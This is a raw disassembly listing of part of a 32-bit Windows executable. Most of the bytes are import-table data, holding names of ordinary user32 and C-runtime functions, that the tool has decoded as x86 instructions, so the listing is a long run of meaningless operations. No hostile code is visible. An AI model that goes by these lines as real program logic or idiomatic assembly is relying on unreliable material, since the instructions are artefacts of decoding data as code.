  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
